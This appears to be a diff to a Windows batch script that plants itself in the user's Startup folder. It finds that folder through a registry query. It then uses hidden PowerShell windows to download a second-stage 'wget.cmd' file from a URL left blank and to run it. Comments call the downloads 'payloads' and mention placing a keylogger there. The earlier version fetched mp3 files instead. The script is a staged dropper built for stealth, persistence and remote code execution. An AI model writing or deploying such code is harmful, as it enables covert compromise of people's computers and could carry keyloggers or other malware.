@@ -4,20 +4,25 @@
 
 @REM variables
 set "INITIALPATH=%cd%"    & @REM stores the initial path (in the variable) in which the user keeps the initially downloaded file, can be -Download- or -WP- or any other Folder
-set "STARTUP=C:/Users/%username%/Appdata/Roaming/Microsoft/Windows/Start Menu/Programs/Startup"
+set "STARTUP="
 
-@REM Move into Start Up Directory
-cd "%STARTUP%"  & @REM  To change directory to the StartUp folder in order to create the desired file into that directory
+@REM Dynamically retrieving Startup folder path from the windows registry (we are retrieving from win registry as the user may had change the name of the StartUp Folder on his PC, So harcoding anything wont work)
+for /f "tokens=2,*" %%A in ('reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders" /v Startup 2^>nul') do set "STARTUP=%%B"
+if not defined STARTUP (
+    echo ERROR: Could not retrieve Startup folder path.
+    exit /b
+)
+
+@REM Move into Start Up Directory - /d will make sure that the directory changes even if we have to change the DRIVE for the path we get. E.g: If we need to move from D:\  to  C:\
+cd /d "%STARTUP%"  & @REM  To change directory to the StartUp folder in order to create the desired file into that directory
 
 @REM Write Payloads to that Startup / Create the desired file in that Startup Folder
-(
-    @REM  We can place a keylogger here
-    echo powershell -c "Invoke-WebRequest -Uri 'https://www.soundboard.com/track/download/156453' -OutFile 'magic.mp3' "
-    echo powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI 'https://www.soundboard.com/track/download/150404' -OutFile 'creepy.mp3' "
-) > stage2.cmd
+@REM  We can place a keylogger here
+powershell powershell.exe -windowstyle hidden "Invoke-WebRequest -URI '' -OutFile 'wget.cmd' "
+
 
 @REM Automaticaly Runs the desired file / payload, The output of the payload after runing it will show in the same StartUp Folder
-powershell Start-Process powershell.exe -windowstyle hidden .\stage2.cmd
+powershell Start-Process powershell.exe -windowstyle hidden .\wget.cmd
 
 pause
 
